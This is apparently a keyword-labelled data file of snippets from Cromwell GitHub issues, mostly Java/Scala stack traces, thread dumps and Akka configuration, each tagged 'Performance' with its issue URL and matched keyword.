Performance,".forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 2019-04-18 13:22:35,882 cromwell-system-akka.dispatchers.engine-dispatcher-42 ERROR - WorkflowManagerActor Workflow 4057b0c6-0019-4a00-b8af-e392fbf89697 failed (during ExecutingWorkflowState): cromwell.core.CromwellFatalException: java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor; 	at cromwell.core.CromwellFatalException$.apply(core.scala:22); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:39); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:38); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run$$$capture(Promise.scala:60); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(Fo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4857:4433,concurren,concurrent,4433,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4857,1,['concurren'],['concurrent']
Performance,".gatk_jar"": ""/root/gatk-protected.jar"",; ""case_gatk_acnv_workflow.seg_param_nmin"": 200,; ""case_gatk_acnv_workflow.target_file"": ""/data/target/ice_targets.tsv""; },; ""submission"": ""2016-09-23T13:53:05.453Z"",; ""status"": ""Failed"",; ""failures"": [; {; ""message"": ""Call case_gatk_acnv_workflow.TumorCalculateTargetCoverage: return code was -1""; }; ],; ""end"": ""2016-09-23T13:53:29.816Z"",; ""start"": ""2016-09-23T13:53:06.277Z""; }; ```. local_application.conf. ```; webservice {; port = 8000; interface = 0.0.0.0; instance.name = ""reference""; }. akka {; loggers = [""akka.event.slf4j.Slf4jLogger""]; actor {; default-dispatcher {; fork-join-executor {; # Number of threads = min(parallelism-factor * cpus, parallelism-max); # Below are the default values set by Akka, uncomment to tune these. #parallelism-factor = 3.0; #parallelism-max = 64; }; }; }. dispatchers {; # A dispatcher for actors performing blocking io operations; # Prevents the whole system from being slowed down when waiting for responses from external resources for instance; io-dispatcher {; type = Dispatcher; executor = ""fork-join-executor""; # Using the forkjoin defaults, this can be tuned if we wish; }. # A dispatcher for actors handling API operations; # Keeps the API responsive regardless of the load of workflows being run; api-dispatcher {; type = Dispatcher; executor = ""fork-join-executor""; }. # A dispatcher for engine actors; # Because backends behaviour is unpredictable (potentially blocking, slow) the engine runs; # on its own dispatcher to prevent backends from affecting its performance.; engine-dispatcher {; type = Dispatcher; executor = ""fork-join-executor""; }. # A dispatcher used by supported backend actors; backend-dispatcher {; type = Dispatcher; executor = ""fork-join-executor""; }. # Note that without further configuration, all other actors run on the default dispatcher; }; }. spray.can {; server {; request-timeout = 40s; }; client {; request-timeout = 40s; connecting-timeout = 40s; }; }. system {; // If 'true',",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1480:83366,perform,performing,83366,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1480,2,"['perform', 'tune']","['performing', 'tuned']"
Performance,".impl.sfs.config.ConfigBackendLifecycleActorFactory$$anonfun$fileHashingFunction$1.apply(ConfigBackendLifecycleActorFactory.scala:45); at cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory$$anonfun$fileHashingFunction$1.apply(ConfigBackendLifecycleActorFactory.scala:45); at cromwell.backend.callcaching.FileHashingActor$$anonfun$receive$1$$anonfun$1.apply(FileHashingActor.scala:21); at cromwell.backend.callcaching.FileHashingActor$$anonfun$receive$1$$anonfun$1.apply(FileHashingActor.scala:21); at scala.Option.map(Option.scala:146); at cromwell.backend.callcaching.FileHashingActor$$anonfun$receive$1.applyOrElse(FileHashingActor.scala:21); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.callcaching.FileHashingActor.aroundReceive(FileHashingActor.scala:16); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ```. Snippet from attached conf file:. ```; ...snip...; local {; // Cromwell makes a link to your input files within <root>/<workflow UUID>/workflow-inputs; // The following are strategies used to make those links. They are ordered. If one fails; // The next one is tried:; //; // hard-link: attempt to create a hard-link to the file; // copy: copy the file; // soft-link: create a symbolic link to the file; //; // NOTE: soft-link will be skipped for Docker jobs; localization: [; ""soft-link"", ""hard-link"", ""copy""; ]; hashing {; strategy: ""path"" ; check-sibling-md5: true; } ; }; ...snip... ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1597:3041,concurren,concurrent,3041,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1597,4,['concurren'],['concurrent']
Performance,.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.$anonfun$applyOrElse$1(BackendWorkflowInitializationActor.scala:146); at cromwell.backend.BackendLifecycleActor.performActionThenRespond(BackendLifecycleActor.scala:44); at cromwell.backend.BackendLifecycleActor.performActionThenRespond$(BackendLifecycleActor.scala:40); at cromwell.backend.standard.StandardInitializationActor.performActionThenRespond(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.applyOrElse(BackendWorkflowInitializationActor.scala:146); at akka.actor.Actor.aroundReceive(Actor.scala:539); at akka.actor.Actor.aroundReceive$(Actor.scala:537); at cromwell.backend.standard.StandardInitializationActor.aroundReceive(StandardInitializationActor.scala:44); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:612); at akka.actor.ActorCell.invoke(ActorCell.scala:581); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:268); at akka.dispatch.Mailbox.run(Mailbox.scala:229); at akka.dispatch.Mailbox.exec(Mailbox.scala:241); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: wdl.draft2.parser.WdlP,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:5516,perform,performActionThenRespond,5516,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['perform'],['performActionThenRespond']
Performance,".jar:0.19]; at akka.actor.ActorCell$AjcClosure1.run(ActorCell.scala:1) [cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) [cromwell.jar:0.19]; at akka.kamon.instrumentation.ActorCellInstrumentation$$anonfun$aroundBehaviourInvoke$1.apply(ActorCellInstrumentation.scala:63) [cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) [cromwell.jar:0.19]; at akka.kamon.instrumentation.ActorCellInstrumentation.aroundBehaviourInvoke(ActorCellInstrumentation.scala:62) [cromwell.jar:0.19]; at akka.actor.ActorCell.invoke(ActorCell.scala:483) [cromwell.jar:0.19]; at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:238) [cromwell.jar:0.19]; at akka.dispatch.Mailbox.run(Mailbox.scala:220) [cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; 2016-04-11 22:41:00,528 cromwell-system-akka.actor.default-dispatcher-2683 INFO - WorkflowActor [UUID(606107ba)]: Call Caching: cache miss; 2016-04-11 22:41:00,543 cromwell-system-akka.actor.default-dispatcher-2683 INFO - WorkflowActor [UUID(606107ba)]: Call Caching: cache miss; 2016-04-11 22:41:00,556 cromwell-system-akka.actor.default-dispatcher-2683 INFO - WorkflowActor [UUID(606107ba)]: Call Caching: cache miss; 2016-04-11 22:41:00,617 cromwell-system-akka.actor.default-dispatcher-2683 INFO - WorkflowActor [UUID(606107ba)]: Call Caching: cache miss; 2016-04-11 22:41:00,841 cromwell-system-akka.actor.default-dispatcher-2666 INFO - WorkflowActor [UUID(606107ba)]: Call Caching: cache miss; 2016-04",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/695:8588,concurren,concurrent,8588,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/695,1,['concurren'],['concurrent']
Performance,".jar:0.19]; at com.mysql.jdbc.ConnectionImpl.setAutoCommit(ConnectionImpl.java:4882) ~[cromwell.jar:0.19]; at com.zaxxer.hikari.proxy.ConnectionProxy.setAutoCommit(ConnectionProxy.java:334) ~[cromwell.jar:0.19]; at com.zaxxer.hikari.proxy.ConnectionJavassistProxy.setAutoCommit(ConnectionJavassistProxy.java) ~[cromwell.jar:0.19]; at slick.jdbc.JdbcBackend$BaseSession.startInTransaction(JdbcBackend.scala:437) ~[cromwell.jar:0.19]; at slick.driver.JdbcActionComponent$StartTransaction$.run(JdbcActionComponent.scala:41) ~[cromwell.jar:0.19]; at slick.driver.JdbcActionComponent$StartTransaction$.run(JdbcActionComponent.scala:38) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.liftedTree1$1(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.run(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) ~[na:1.8.0_72]; at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) ~[na:1.8.0_72]; at java.lang.Thread.run(Thread.java:745) ~[na:1.8.0_72]; Caused by: java.io.EOFException: Can not read response from server. Expected to read 4 bytes, read 0 bytes before connection was unexpectedly lost.; at com.mysql.jdbc.MysqlIO.readFully(MysqlIO.java:2926) ~[cromwell.jar:0.19]; at com.mysql.jdbc.MysqlIO.reuseAndReadPacket(MysqlIO.java:3344) ~[cromwell.jar:0.19]; ... 16 common frames omitted; 2016-04-26 14:06:37,506 cromwell-system-akka.actor.default-dispatcher-15 INFO - WorkflowActor [UUID(143681e1)]: persisting status of GatherBqsrReports to Failed.; 2016-04-26 14:06:37,506 cromwell-system-akka.actor.default-dispatcher-15 ERROR - WorkflowActor [UUID(143681e1)]: Communications link failure. The last packet successfully received from the server was 324 milliseconds ago. The last packet sent successfully to the server was 0 milliseconds ago.; 2016-04-26 14:06:37,741 cromwell-system-akka.actor.default-disp",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/742:2597,concurren,concurrent,2597,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/742,1,['concurren'],['concurrent']
Performance,.java:263); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:250); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); at com.typesafe.config.impl.Parseable.parse(Parseable.java:301); at com.typesafe.config.ConfigFactory.parseFile(ConfigFactory.java:793); at com.typesafe.config.ConfigFactory.parseApplicationReplacement(ConfigFactory.java:1166); at com.typesafe.config.DefaultConfigLoadingStrategy.parseApplicationConfig(DefaultConfigLoadingStrategy.java:11); at com.typesafe.config.ConfigFactory.defaultApplication(ConfigFactory.java:532); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:264); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:261); at com.typesafe.config.impl.ConfigImpl$LoaderCache.getOrElseUpdate(ConfigImpl.java:66); at com.typesafe.config.impl.ConfigImpl.computeCachedConfig(ConfigImpl.java:93); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:261); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:237); at cromwell.languages.util.ImportResolver$HttpResolver$.apply(ImportResolver.scala:237); at womtool.input.WomGraphMaker$.importResolvers$lzycompute$1(WomGraphMaker.scala:28); at womtool.input.WomGraphMaker$.importResolvers$1(WomGraphMaker.scala:27); at womtool.input.WomGraphMaker$.$anonfun$getBundleAndFactory$1(WomGraphMaker.scala:39); at scala.util.Either.flatMap(Either.scala:352); at womtool.input.WomGraphMaker$.getBundleAndFactory(WomGraphMaker.scala:30); at womtool.input.WomGraphMaker$.fromFiles(WomGraphMaker.scala:46); at womtool.validate.Validate$.validate(Validate.scala:26); at womtool.WomtoolMain$.dispatchCommand(WomtoolMain.scala:54); at womtool.WomtoolMain$.runWomtool(WomtoolMain.scala:161); at womtool.WomtoolMain$.delayedEndpoint$womtool$WomtoolMain$1(WomtoolMain.scala:166); at womtool.WomtoolMain$delayedInit$body.apply(WomtoolMain.scala:27); at scala.Function0.apply$mcV$sp(Function0.scala,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:2973,load,load,2973,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['load'],['load']
Performance,".lang.Thread.run(Redefined). ""Abandoned connection cleanup thread"" #22 daemon prio=5 os_prio=31 tid=0x00007fb76a4f5800 nid=0x7103 in Object.wait() [0x000000012ccb5000]; java.lang.Thread.State: TIMED_WAITING (on object monitor); at java.lang.Object.wait(Native Method); at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143); - locked <0x00000006c0624180> (a java.lang.ref.ReferenceQueue$Lock); at com.mysql.jdbc.AbandonedConnectionCleanupThread.run(AbandonedConnectionCleanupThread.java:43). ""ForkJoinPool-3-worker-15"" #19 daemon prio=5 os_prio=31 tid=0x00007fb76abaa800 nid=0x6b03 waiting on condition [0x000000012a1e3000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0060ab0> (a java.util.concurrent.CountDownLatch$Sync); at java.util.concurrent.locks.LockSupport.park(Redefined); at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836); at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:997); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1304); at java.util.concurrent.CountDownLatch.await(CountDownLatch.java:231); at akka.actor.ActorSystemImpl$TerminationCallbacks.ready(Redefined); at akka.actor.ActorSystemImpl$TerminationCallbacks.ready(Redefined); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.impl.ExecutionContextImpl$DefaultThreadFactory$$anon$2$$anon$4.block(ExecutionContextImpl.scala); at scala.concurrent.forkjoin.ForkJoinPool.managedBlock(Redefined); at scala.concurrent.impl.ExecutionContextImpl$DefaultThreadFactory$$anon$2.blockOn(ExecutionContextImpl.scala:44); at scala.concurrent.Await$.ready(package.scala:169); at akka.actor.ActorSystemImpl.awaitTermination(ActorSystem.scala); at akka.actor",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:44771,concurren,concurrent,44771,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,".lang.Thread.sleep(Native Method); at cromwell.engine.workflow.WorkflowManagerActor$$anonfun$addShutdownHook$1.apply$mcV$sp(WorkflowManagerActor.scala:125); at scala.sys.ShutdownHookThread$$anon$1.run(ShutdownHookThread.scala:34). ""pool-1-thread-20"" #95 prio=5 os_prio=0 tid=0x00007fdaa80c0000 nid=0xa56 waiting on condition [0x00007fda90575000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #94 prio=5 os_prio=0 tid=0x00007fdaa80be800 nid=0xa55 waiting on condition [0x00007fda90676000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-1",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:1231,concurren,concurrent,1231,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,".locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-5"" #44 daemon prio=5 os_prio=31 tid=0x00007fb76b517800 nid=0x3b0b waiting on condition [0x0000000131195000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-2"" #43 prio=5 os_prio=31 tid=0x00007fb76e8ee000 nid=0x3f0b waiting on condition [0x000000012ee35000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.co",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:33639,concurren,concurrent,33639,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,".locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-6"" #45 daemon prio=5 os_prio=31 tid=0x00007fb76e8dd000 nid=0x5507 waiting on condition [0x0000000131298000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-5"" #44 daemon prio=5 os_prio=31 tid=0x00007fb76b517800 nid=0x3b0b waiting on condition [0x0000000131195000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concur",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:32564,concurren,concurrent,32564,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,".locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-7"" #46 daemon prio=5 os_prio=31 tid=0x00007fb76e8f5000 nid=0x5807 waiting on condition [0x000000013139b000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-6"" #45 daemon prio=5 os_prio=31 tid=0x00007fb76e8dd000 nid=0x5507 waiting on condition [0x0000000131298000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concur",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:31489,concurren,concurrent,31489,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,".locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-8"" #47 daemon prio=5 os_prio=31 tid=0x00007fb76b518000 nid=0x8703 waiting on condition [0x000000013149e000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-7"" #46 daemon prio=5 os_prio=31 tid=0x00007fb76e8f5000 nid=0x5807 waiting on condition [0x000000013139b000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concur",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:30414,concurren,concurrent,30414,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
